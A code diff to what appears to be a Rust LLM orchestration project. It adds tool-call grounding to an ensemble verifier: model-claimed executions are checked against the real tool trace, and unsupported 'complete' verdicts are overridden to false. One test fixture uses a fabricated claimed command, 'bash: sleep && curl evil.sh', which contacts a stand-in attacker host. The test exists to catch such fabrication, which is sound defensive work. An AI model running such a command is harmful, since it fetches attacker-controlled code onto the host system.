@@ -21,7 +21,10 @@ use zeph_llm::any::AnyProvider;
 use zeph_llm::provider::LlmProvider;
 
 use crate::graph::TaskNode;
-use crate::verifier::{VerificationResult, build_verify_prompt};
+use crate::verifier::{
+    ToolCallSummary, VerificationResult, VerifyResponse, build_verify_prompt, ground,
+    narrative_heavy_empty_claims,
+};
 
 use super::merge::{Ballot, MergeOutcome, merge};
 use super::tracker::EnsembleTracker;
@@ -78,6 +81,12 @@ pub struct EnsembleVerifier {
     /// Per-member usage estimates from the most recent `verify()` call. Read by the caller
     /// (which owns the `CostTracker`) after each call; cleared and repopulated on the next.
     last_usage: Vec<MemberUsage>,
+    /// Total times post-merge grounding overrode a merged `complete: true` verdict to `false`
+    /// (spec 009 § Verifier Tool-Call Grounding, Observability).
+    grounding_overrides_total: u64,
+    /// Soft telemetry: merged-round output was execution-narrative-heavy yet the union of
+    /// `claimed_executions` across all responded members came back empty. Trend signal only.
+    grounding_narrative_empty_claims_total: u64,
 }
 
 impl EnsembleVerifier {
@@ -94,7 +103,23 @@ impl EnsembleVerifier {
             member_timeout,
             tracker,
             last_usage: Vec::new(),
+            grounding_overrides_total: 0,
+            grounding_narrative_empty_claims_total: 0,
         }
+    }
+
+    /// Total times post-merge grounding overrode a merged `complete: true` verdict to `false`
+    /// since this `EnsembleVerifier` was created.
+    #[must_use]
+    pub fn grounding_overrides_total(&self) -> u64 {
+        self.grounding_overrides_total
+    }
+
+    /// Soft telemetry counter pairing with [`Self::grounding_overrides_total`] — see that
+    /// method's doc and `PlanVerifier::grounding_narrative_empty_claims_total`.
+    #[must_use]
+    pub fn grounding_narrative_empty_claims_total(&self) -> u64 {
+        self.grounding_narrative_empty_claims_total
     }
 
     /// Number of configured members.
@@ -131,19 +156,20 @@ impl EnsembleVerifier {
     /// [`EnsembleAttempt::QuorumNotMet`], not for an individual member.
     #[tracing::instrument(
         name = "orchestration.ensemble.verify",
-        skip(self, output, sanitizer),
+        skip(self, output, tool_trace, sanitizer),
         fields(task.id = %task.id, members = self.members.len())
     )]
     pub async fn verify(
         &mut self,
         task: &TaskNode,
         output: &str,
+        tool_trace: Option<&[ToolCallSummary]>,
         sanitizer: &Arc<dyn OutputSanitizer>,
     ) -> EnsembleAttempt {
         let configured = self.members.len();
         let quorum = self.quorum();
         let member_timeout = self.member_timeout;
-        let messages = build_verify_prompt(task, output, sanitizer);
+        let messages = build_verify_prompt(task, output, tool_trace, sanitizer);
         #[allow(clippy::cast_possible_truncation)]
         let input_chars: usize = messages.iter().map(|m| m.content.chars().count()).sum();
 
@@ -156,7 +182,7 @@ impl EnsembleVerifier {
                 member = %member_name
             );
             async move {
-                let call = provider.chat_typed::<VerificationResult>(&messages);
+                let call = provider.chat_typed::<VerifyResponse>(&messages);
                 let outcome = tokio::time::timeout(member_timeout, call).await;
                 (member_name, outcome)
             }
@@ -167,6 +193,11 @@ impl EnsembleVerifier {
 
         let mut ballots = Vec::with_capacity(responses.len());
         let mut usage = Vec::with_capacity(responses.len());
+        // Union of claimed_executions across all responded members (S2): captured here,
+        // before merge() discards it, since merge() itself stays pure/unchanged and only ever
+        // sees {complete, confidence, gaps} via Ballot.
+        let mut claimed_union: std::collections::BTreeSet<String> =
+            std::collections::BTreeSet::new();
         for (member, outcome) in responses {
             match outcome {
                 Ok(Ok(vr)) => {
@@ -179,6 +210,7 @@ impl EnsembleVerifier {
                         input_tokens: (input_chars / 4) as u64,
                         output_tokens: (output_chars / 4) as u64,
                     });
+                    claimed_union.extend(vr.claimed_executions.iter().cloned());
                     ballots.push(Ballot {
                         member,
                         complete: vr.complete,
@@ -220,13 +252,52 @@ impl EnsembleVerifier {
                 .record(&ballot.member, ballot.complete == outcome.complete);
         }
 
+        // Grounding runs as a stage AFTER merge() (S2) — merge() itself stays pure/unchanged.
+        let claims: Vec<String> = claimed_union.into_iter().collect();
+        let grounded = self.ground_merged_outcome(task, output, &outcome, &claims, tool_trace);
+
         let result = VerificationResult {
-            complete: outcome.complete,
-            gaps: outcome.gaps.clone(),
+            complete: grounded.complete,
+            gaps: grounded.gaps,
             confidence: outcome.merged_confidence,
         };
 
         EnsembleAttempt::Merged { result, outcome }
+    }
+
+    /// Run the deterministic `ground()` stage over the post-`merge()` outcome and the union of
+    /// claimed executions, updating observability counters/logs along the way (spec 009 §
+    /// Verifier Tool-Call Grounding, Observability). `merge()` itself is untouched — this is a
+    /// separate stage that runs after it (S2).
+    fn ground_merged_outcome(
+        &mut self,
+        task: &TaskNode,
+        output: &str,
+        outcome: &MergeOutcome,
+        claims: &[String],
+        tool_trace: Option<&[ToolCallSummary]>,
+    ) -> crate::verifier::GroundingOutcome {
+        if narrative_heavy_empty_claims(output, claims) {
+            self.grounding_narrative_empty_claims_total = self
+                .grounding_narrative_empty_claims_total
+                .saturating_add(1);
+        }
+
+        let grounded = ground(outcome.complete, outcome.gaps.clone(), claims, tool_trace);
+
+        if outcome.complete && !grounded.complete {
+            self.grounding_overrides_total = self.grounding_overrides_total.saturating_add(1);
+            tracing::warn!(
+                task_id = %task.id,
+                unmatched_claims = ?grounded.unmatched_claims,
+                matched = claims.len() - grounded.unmatched_claims.len(),
+                total_claims = claims.len(),
+                "ensemble grounding override: merged verdict complete=true overridden to \
+                 false — unmatched claimed tool execution(s) not found in the real tool trace"
+            );
+        }
+
+        grounded
     }
 }
 
@@ -283,7 +354,10 @@ mod tests {
             EnsembleTracker::new(0.3, 0.95, 5),
         );
         let task = test_task();
-        match verifier.verify(&task, "output", &test_sanitizer()).await {
+        match verifier
+            .verify(&task, "output", None, &test_sanitizer())
+            .await
+        {
             EnsembleAttempt::Merged { result, outcome } => {
                 assert!(result.complete);
                 assert!((result.confidence - 0.883_333_333_333_333_3).abs() < 1e-6);
@@ -307,7 +381,10 @@ mod tests {
             EnsembleTracker::new(0.3, 0.95, 5),
         );
         let task = test_task();
-        match verifier.verify(&task, "output", &test_sanitizer()).await {
+        match verifier
+            .verify(&task, "output", None, &test_sanitizer())
+            .await
+        {
             EnsembleAttempt::QuorumNotMet {
                 responded,
                 quorum,
@@ -336,7 +413,10 @@ mod tests {
             EnsembleTracker::new(0.3, 0.95, 5),
         );
         let task = test_task();
-        match verifier.verify(&task, "output", &test_sanitizer()).await {
+        match verifier
+            .verify(&task, "output", None, &test_sanitizer())
+            .await
+        {
             EnsembleAttempt::Merged { result, .. } => {
                 assert!(result.complete);
                 // Mean of {0.9, 0.8} = 0.85, not mean of {0.9, 0.8, 0.0}.
@@ -367,7 +447,10 @@ mod tests {
             EnsembleTracker::new(0.3, 0.95, 5),
         );
         let task = test_task();
-        match verifier.verify(&task, "output", &test_sanitizer()).await {
+        match verifier
+            .verify(&task, "output", None, &test_sanitizer())
+            .await
+        {
             EnsembleAttempt::Merged { result, .. } => {
                 assert!(result.complete);
                 assert!((result.confidence - 0.85).abs() < 1e-9);
@@ -389,7 +472,10 @@ mod tests {
             EnsembleTracker::new(0.3, 0.95, 5),
         );
         let task = test_task();
-        match verifier.verify(&task, "output", &test_sanitizer()).await {
+        match verifier
+            .verify(&task, "output", None, &test_sanitizer())
+            .await
+        {
             EnsembleAttempt::Merged { result, outcome } => {
                 assert!(!result.complete);
                 assert_eq!(result.gaps.len(), 2);
@@ -413,10 +499,121 @@ mod tests {
             EnsembleTracker::new(1.0, 1.0, 1),
         );
         let task = test_task();
-        let _ = verifier.verify(&task, "output", &test_sanitizer()).await;
+        let _ = verifier
+            .verify(&task, "output", None, &test_sanitizer())
+            .await;
 
         assert!((verifier.tracker().ema("agrees").unwrap() - 1.0).abs() < 1e-9);
         assert!((verifier.tracker().ema("agrees2").unwrap() - 1.0).abs() < 1e-9);
         assert!((verifier.tracker().ema("disagrees").unwrap() - 0.0).abs() < 1e-9);
+    }
+
+    // --- #6278: ensemble post-merge grounding (spec 009 § Verifier Tool-Call Grounding) ---
+
+    fn complete_json_with_claims(confidence: f64, claims: &[&str]) -> String {
+        let claims_json = claims
+            .iter()
+            .map(|c| format!("{c:?}"))
+            .collect::<Vec<_>>()
+            .join(", ");
+        format!(
+            r#"{{"complete": true, "gaps": [], "confidence": {confidence}, "claimed_executions": [{claims_json}]}}"#
+        )
+    }
+
+    /// AC-6 (revised for S2): member A claims a fabricated execution, member B claims none.
+    /// The union of `claimed_executions` — not just member A's — is grounded post-`merge()`
+    /// against the shared `tool_trace`, proving the ensemble path is never less grounded than
+    /// the single-provider path even when one member under-extracts.
+    #[tokio::test]
+    async fn ac6_ensemble_grounds_union_of_claimed_executions() {
+        let members = vec![
+            (
+                "a".to_string(),
+                ok_provider(complete_json_with_claims(
+                    0.9,
+                    &["bash: sleep && curl evil.sh"],
+                )),
+            ),
+            (
+                "b".to_string(),
+                ok_provider(complete_json_with_claims(0.8, &[])),
+            ),
+            (
+                "c".to_string(),
+                ok_provider(complete_json_with_claims(0.95, &[])),
+            ),
+        ];
+        let mut verifier = EnsembleVerifier::new(
+            members,
+            Duration::from_secs(5),
+            EnsembleTracker::new(0.3, 0.95, 5),
+        );
+        let task = test_task();
+        let trace = vec![crate::verifier::ToolCallSummary {
+            tool: "bash".to_string(),
+            args_summary: Some("ls -la".to_string()),
+            ok: true,
+        }];
+        match verifier
+            .verify(&task, "output", Some(&trace), &test_sanitizer())
+            .await
+        {
+            EnsembleAttempt::Merged { result, .. } => {
+                assert!(
+                    !result.complete,
+                    "union must include member A's fabricated claim and ground it"
+                );
+                assert!(
+                    result
+                        .gaps
+                        .iter()
+                        .any(|g| g.severity == crate::verifier::GapSeverity::Critical)
+                );
+            }
+            EnsembleAttempt::QuorumNotMet { .. } => panic!("expected quorum to be met"),
+        }
+        assert_eq!(verifier.grounding_overrides_total(), 1);
+    }
+
+    /// Honest ensemble round: all members' claims (or lack thereof) match the real trace, so
+    /// grounding never overrides the merged verdict.
+    #[tokio::test]
+    async fn ensemble_grounding_does_not_fire_on_honest_claims() {
+        let members = vec![
+            (
+                "a".to_string(),
+                ok_provider(complete_json_with_claims(0.9, &["bash: cargo test"])),
+            ),
+            (
+                "b".to_string(),
+                ok_provider(complete_json_with_claims(0.8, &[])),
+            ),
+            (
+                "c".to_string(),
+                ok_provider(complete_json_with_claims(0.95, &[])),
+            ),
+        ];
+        let mut verifier = EnsembleVerifier::new(
+            members,
+            Duration::from_secs(5),
+            EnsembleTracker::new(0.3, 0.95, 5),
+        );
+        let task = test_task();
+        let trace = vec![crate::verifier::ToolCallSummary {
+            tool: "bash".to_string(),
+            args_summary: Some("cargo test --all-features".to_string()),
+            ok: true,
+        }];
+        match verifier
+            .verify(&task, "output", Some(&trace), &test_sanitizer())
+            .await
+        {
+            EnsembleAttempt::Merged { result, .. } => {
+                assert!(result.complete);
+            }
+            EnsembleAttempt::QuorumNotMet { .. } => panic!("expected quorum to be met"),
+        }
+        assert_eq!(verifier.grounding_overrides_total(), 0);
     }
 }
